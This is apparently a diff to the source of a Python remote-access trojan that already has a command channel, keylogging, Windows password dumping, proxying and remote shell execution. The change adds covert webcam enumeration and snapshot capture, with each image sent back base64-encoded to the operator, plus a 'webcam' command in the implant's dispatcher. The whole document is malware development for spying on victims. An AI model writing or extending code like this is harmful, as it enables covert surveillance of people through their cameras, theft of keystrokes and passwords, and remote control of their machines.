@@ -15,6 +15,7 @@ import getpass
 import ctypes
 import sys
 import string
+import vidcap
 
 if os.name == "nt":
 	import passdump
@@ -84,22 +85,22 @@ class Channel:
 		logging.debug("Channel created with ID "+str(ord(self.id)))
 		
 	def write_input(self, data):
-		logging.debug("Data written into channel #"+str(ord(self.id))+" input: "+data.strip())
+		logging.debug("Data written into channel #"+str(ord(self.id))+" input: "+data.strip()[:100])
 		self.input_queue.put(data)
 		
 	def read_input(self, blocking=True):
 		try:
 			data = self.input_queue.get(blocking)
-			logging.debug("Data read from channel #"+str(ord(self.id))+" input: "+data.strip())
+			logging.debug("Data read from channel #"+str(ord(self.id))+" input: "+data.strip()[:100])
 			return data
 		except Queue.Empty: return None
 		
 	def write_output(self, data):
-		logging.debug("Data written into channel #"+str(ord(self.id))+" output: "+data.strip())
+		logging.debug("Data written into channel #"+str(ord(self.id))+" output: "+data.strip()[:100])
 		self.output_queue.put(self.id+data)
 		
 	def signal(self, data):
-		logging.debug("Signal from channel #"+str(ord(self.id))+": "+data)
+		logging.debug("Signal from channel #"+str(ord(self.id))+": "+data[:100])
 		self.output_queue.put(chr(254)+data)
 		
 	def __repr__(self):
@@ -322,7 +323,7 @@ class Transport:
 		while not ct.stopped() and not self.disconnected:
 			data = self.master_queue.get()
 			self.send(data)
-			logging.debug("Sent data to handler: "+data[1:])
+			logging.debug("Sent data to handler: "+data[1:][:100])
 			
 	def receiver_loop(self):
 		ct = threading.currentThread()
@@ -330,7 +331,7 @@ class Transport:
 			data = self.recv()
 			try:
 				identifier, data = data[0], data[1:]
-				logging.debug("Received data from handler: "+data.strip())
+				logging.debug("Received data from handler: "+data.strip()[:100])
 				self.channels[identifier].write_input(data)
 			except Exception as e:
 				try: logging.warn("Received data with invalid identifier "+str(ord(identifier))+": "+data.strip())
@@ -340,7 +341,7 @@ class Transport:
 		ct = threading.currentThread()
 		while not ct.stopped():
 			signal = self.signal_channel.read_input()
-			logging.info("Got signal: "+signal)
+			logging.info("Got signal: "+signal[:100])
 			if signal.startswith("CREATE_CHANNEL"):
 				self.create_channel(signal.split(":")[1])
 			elif signal.startswith("CREATE_PROXY"):
@@ -565,6 +566,33 @@ class Information_Gathering:
 		self.key_log = ""
 		return log
 		
+	@windows_only
+	def webcam_list(self):
+		num = 0
+		cams = "Available cameras:"
+		while True:
+			try:
+				cam = vidcap.new_Dev(num, 0)
+				cams += "\n["+str(num)+"] "+cam.getdisplayname()
+			except Exception as e:
+				break
+			num += 1
+			
+		return cams
+		
+	@windows_only
+	def webcam_snap(self, id):
+		try:
+			cam = vidcap.new_Dev(int(id), 0)
+		except:
+			return "[-] No such camera found: "+str(id)
+			
+		time.sleep(2) # So camera has time to adjust focus, brightness, etc.
+		
+		buffer, width, height = cam.getbuffer()
+		
+		return base64.b64encode(buffer)+"|"+str(width)+"|"+str(height)+"|"
+		
 class Networking:
 	"""
 	Network discovery, port scans, etc.
@@ -729,6 +757,19 @@ help - This menu!
 					output = info.keylog_stop()
 				elif arg == "dump":
 					output = info.keylog_dump()
+			elif data.startswith("webcam"):
+				try:
+					arg = data.split()[1]
+				except:
+					output = "[*] Usage: webcam [list|snap [id] ]"
+					arg = ""
+				
+				if arg == "list":
+					output = info.webcam_list()
+				elif arg == "snap":
+					try: num = data.split()[2]
+					except: output = "[*] Usage: webcam [list|snap [id] ]"
+					output = info.webcam_snap(num)
 			else:
 				output = execute.execute_shell_command(data)[1]
 				
